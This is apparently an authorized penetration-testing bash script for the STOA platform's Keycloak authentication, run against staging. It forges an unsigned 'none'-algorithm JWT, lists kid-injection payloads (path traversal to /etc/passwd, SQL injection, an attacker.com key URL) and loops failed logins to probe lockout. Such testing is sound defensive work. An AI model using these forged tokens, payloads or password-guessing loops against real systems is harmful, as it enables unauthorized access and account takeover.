#!/bin/bash
# STOA Platform - Authentication Bypass Testing Script
# Ticket: CAB-236
#
# This script tests various JWT and authentication bypass techniques
# IMPORTANT: Only run against authorized test environments

set -e

# Configuration
KEYCLOAK_URL="${KEYCLOAK_URL:-https://auth.staging.stoa.cab-i.com}"
API_URL="${API_URL:-https://api.staging.stoa.cab-i.com}"
REALM="${REALM:-stoa}"
CLIENT_ID="${CLIENT_ID:-stoa-ui}"
OUTPUT_DIR="${OUTPUT_DIR:-./results/auth-bypass}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Create output directory
mkdir -p "$OUTPUT_DIR"

log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

log_finding() {
    echo -e "${RED}[FINDING]${NC} $1"
    echo "[$(date -Iseconds)] FINDING: $1" >> "$OUTPUT_DIR/findings.log"
}

# -----------------------------------------------------------------------------
# Test 1: JWT None Algorithm Attack
# -----------------------------------------------------------------------------
test_jwt_none_algorithm() {
    log_info "Testing JWT 'none' algorithm bypass..."

    if [ -z "$VALID_TOKEN" ]; then
        log_warn "No valid token provided, skipping JWT none attack"
        return
    fi

    # Extract header and payload
    HEADER=$(echo "$VALID_TOKEN" | cut -d'.' -f1)
    PAYLOAD=$(echo "$VALID_TOKEN" | cut -d'.' -f2)

    # Decode header
    DECODED_HEADER=$(echo "$HEADER" | base64 -d 2>/dev/null || echo "$HEADER" | base64 -D 2>/dev/null)
    log_info "Original header: $DECODED_HEADER"

    # Create 'none' algorithm header
    NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')

    # Create token with no signature
    NONE_TOKEN="${NONE_HEADER}.${PAYLOAD}."

    # Test the forged token
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $NONE_TOKEN" \
        "$API_URL/v1/me" 2>/dev/null)

    if [ "$RESPONSE" = "200" ]; then
        log_finding "JWT 'none' algorithm bypass SUCCESSFUL - Critical vulnerability!"
        echo "Forged token: $NONE_TOKEN" >> "$OUTPUT_DIR/jwt-none-bypass.txt"
    else
        log_info "JWT 'none' algorithm bypass blocked (HTTP $RESPONSE)"
    fi
}

# -----------------------------------------------------------------------------
# Test 2: JWT Algorithm Confusion (RS256 -> HS256)
# -----------------------------------------------------------------------------
test_jwt_algorithm_confusion() {
    log_info "Testing JWT algorithm confusion (RS256 -> HS256)..."

    # Fetch JWKS to get public key
    JWKS_URL="$KEYCLOAK_URL/realms/$REALM/protocol/openid-connect/certs"
    log_info "Fetching JWKS from: $JWKS_URL"

    JWKS=$(curl -s "$JWKS_URL")
    echo "$JWKS" > "$OUTPUT_DIR/jwks.json"

    # Extract first public key (RS256 typically)
    PUBLIC_KEY=$(echo "$JWKS" | jq -r '.keys[0].n' 2>/dev/null)

    if [ -n "$PUBLIC_KEY" ] && [ "$PUBLIC_KEY" != "null" ]; then
        log_info "Public key found, algorithm confusion test requires jwt_tool"
        log_info "Manual test: Use jwt_tool -X a -pk public_key.pem $VALID_TOKEN"
    else
        log_warn "Could not extract public key from JWKS"
    fi
}

# -----------------------------------------------------------------------------
# Test 3: JWT Key ID (kid) Injection
# -----------------------------------------------------------------------------
test_jwt_kid_injection() {
    log_info "Testing JWT Key ID (kid) injection..."

    if [ -z "$VALID_TOKEN" ]; then
        log_warn "No valid token provided, skipping kid injection test"
        return
    fi

    # Common kid injection payloads
    KID_PAYLOADS=(
        "../../../../../../etc/passwd"
        "../../../../../../dev/null"
        "http://attacker.com/key"
        "' UNION SELECT 'secret' --"
        "key' OR '1'='1"
    )

    for payload in "${KID_PAYLOADS[@]}"; do
        log_info "Testing kid payload: $payload"
        # Note: Full exploitation requires custom JWT signing
        # This test just documents potential attack vectors
        echo "kid injection payload: $payload" >> "$OUTPUT_DIR/kid-injection-payloads.txt"
    done

    log_info "Kid injection payloads saved for manual testing with jwt_tool"
}

# -----------------------------------------------------------------------------
# Test 4: Token Reuse After Logout
# -----------------------------------------------------------------------------
test_token_reuse_after_logout() {
    log_info "Testing token reuse after logout..."

    if [ -z "$VALID_TOKEN" ]; then
        log_warn "No valid token provided, skipping token reuse test"
        return
    fi

    # Test token before logout
    BEFORE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $VALID_TOKEN" \
        "$API_URL/v1/me" 2>/dev/null)

    log_info "Token status before logout: HTTP $BEFORE"

    # Perform logout
    LOGOUT_URL="$KEYCLOAK_URL/realms/$REALM/protocol/openid-connect/logout"
    curl -s -X POST "$LOGOUT_URL" \
        -H "Authorization: Bearer $VALID_TOKEN" \
        -d "client_id=$CLIENT_ID" > /dev/null 2>&1

    log_info "Logout performed, waiting 2 seconds..."
    sleep 2

    # Test token after logout
    AFTER=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $VALID_TOKEN" \
        "$API_URL/v1/me" 2>/dev/null)

    log_info "Token status after logout: HTTP $AFTER"

    if [ "$AFTER" = "200" ]; then
        log_finding "Token still valid after logout - Session not properly invalidated"
    else
        log_info "Token properly invalidated after logout"
    fi
}

# -----------------------------------------------------------------------------
# Test 5: Expired Token Handling
# -----------------------------------------------------------------------------
test_expired_token() {
    log_info "Testing expired token handling..."

    # Create an obviously expired token (exp in the past)
    EXPIRED_PAYLOAD=$(echo -n '{"sub":"test","exp":1000000000,"iat":1000000000}' | base64 | tr -d '=' | tr '/+' '_-')
    FAKE_HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
    EXPIRED_TOKEN="${FAKE_HEADER}.${EXPIRED_PAYLOAD}.fake_signature"

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $EXPIRED_TOKEN" \
        "$API_URL/v1/me" 2>/dev/null)

    if [ "$RESPONSE" = "200" ]; then
        log_finding "Expired token accepted - Token expiry not validated!"
    else
        log_info "Expired token properly rejected (HTTP $RESPONSE)"
    fi
}

# -----------------------------------------------------------------------------
# Test 6: Account Lockout
# -----------------------------------------------------------------------------
test_account_lockout() {
    log_info "Testing account lockout mechanism..."

    TEST_USER="${TEST_USER:-test-lockout-user}"
    TOKEN_URL="$KEYCLOAK_URL/realms/$REALM/protocol/openid-connect/token"

    LOCKOUT_ATTEMPTS=15
    LOCKED=false

    for i in $(seq 1 $LOCKOUT_ATTEMPTS); do
        RESPONSE=$(curl -s -X POST "$TOKEN_URL" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=password" \
            -d "client_id=$CLIENT_ID" \
            -d "username=$TEST_USER" \
            -d "password=wrong_password_$i")

        ERROR=$(echo "$RESPONSE" | jq -r '.error_description // empty' 2>/dev/null)

        if echo "$ERROR" | grep -qi "locked\|disabled\|temporarily"; then
            log_info "Account locked after $i attempts"
            LOCKED=true
            break
        fi
    done

    if [ "$LOCKED" = false ]; then
        log_finding "Account not locked after $LOCKOUT_ATTEMPTS failed attempts - Missing lockout protection"
    fi
}

# -----------------------------------------------------------------------------
# Test 7: Password Reset Token Analysis
# -----------------------------------------------------------------------------
test_password_reset_flow() {
    log_info "Testing password reset token predictability..."

    # Note: This test would require access to email or capturing reset tokens
    # For now, document the test procedure

    cat << 'EOF' >> "$OUTPUT_DIR/password-reset-test.md"
# Password Reset Token Analysis

## Test Procedure
1. Request password reset for multiple test accounts
2. Capture reset tokens from emails
3. Analyze token entropy and predictability
4. Check for sequential patterns
5. Verify token expiration
6. Test token reuse after password change

## Manual Steps
```bash
# Request reset
curl -X POST "$KEYCLOAK_URL/realms/$REALM/login-actions/reset-credentials" \
  -d "username=test@example.com"

# Analyze token (from email)
# Check: length, character set, randomness
# Tool: Burp Sequencer
```

## Expected Security Controls
- High entropy tokens (>128 bits)
- Single use
- Short expiration (< 1 hour)
- Rate limited requests
EOF

    log_info "Password reset test procedure documented"
}

# -----------------------------------------------------------------------------
# Test 8: OIDC Misconfiguration
# -----------------------------------------------------------------------------
test_oidc_config() {
    log_info "Testing OIDC configuration..."

    WELL_KNOWN="$KEYCLOAK_URL/realms/$REALM/.well-known/openid-configuration"

    CONFIG=$(curl -s "$WELL_KNOWN")
    echo "$CONFIG" | jq . > "$OUTPUT_DIR/oidc-config.json"

    # Check for insecure configurations
    GRANT_TYPES=$(echo "$CONFIG" | jq -r '.grant_types_supported[]' 2>/dev/null)

    if echo "$GRANT_TYPES" | grep -q "implicit"; then
        log_finding "Implicit grant type enabled - Consider disabling for security"
    fi

    if echo "$GRANT_TYPES" | grep -q "password"; then
        log_warn "Resource Owner Password Credentials grant enabled - Review if necessary"
    fi

    # Check token endpoint auth methods
    AUTH_METHODS=$(echo "$CONFIG" | jq -r '.token_endpoint_auth_methods_supported[]' 2>/dev/null)

    if echo "$AUTH_METHODS" | grep -q "none"; then
        log_finding "Public clients allowed (auth method 'none') - Ensure appropriate restrictions"
    fi

    log_info "OIDC configuration saved to $OUTPUT_DIR/oidc-config.json"
}

# -----------------------------------------------------------------------------
# Main Execution
# -----------------------------------------------------------------------------
main() {
    echo "=============================================="
    echo "STOA Platform - Authentication Bypass Testing"
    echo "=============================================="
    echo "Target Keycloak: $KEYCLOAK_URL"
    echo "Target API: $API_URL"
    echo "Realm: $REALM"
    echo "Output: $OUTPUT_DIR"
    echo "=============================================="

    # Get valid token if credentials provided
    if [ -n "$TEST_USERNAME" ] && [ -n "$TEST_PASSWORD" ]; then
        log_info "Obtaining valid token for tests..."
        TOKEN_RESPONSE=$(curl -s -X POST "$KEYCLOAK_URL/realms/$REALM/protocol/openid-connect/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=password" \
            -d "client_id=$CLIENT_ID" \
            -d "username=$TEST_USERNAME" \
            -d "password=$TEST_PASSWORD")

        VALID_TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.access_token' 2>/dev/null)

        if [ -n "$VALID_TOKEN" ] && [ "$VALID_TOKEN" != "null" ]; then
            log_info "Valid token obtained"
            export VALID_TOKEN
        else
            log_error "Failed to obtain valid token"
        fi
    else
        log_warn "No credentials provided (TEST_USERNAME/TEST_PASSWORD)"
        log_warn "Some tests will be skipped"
    fi

    # Run tests
    test_jwt_none_algorithm
    test_jwt_algorithm_confusion
    test_jwt_kid_injection
    test_token_reuse_after_logout
    test_expired_token
    test_account_lockout
    test_password_reset_flow
    test_oidc_config

    echo ""
    echo "=============================================="
    echo "Testing Complete"
    echo "=============================================="
    echo "Results saved to: $OUTPUT_DIR"
    echo "Check $OUTPUT_DIR/findings.log for vulnerabilities"
}

# Run if executed directly
if [ "${BASH_SOURCE[0]}" = "$0" ]; then
    main "$@"
fi
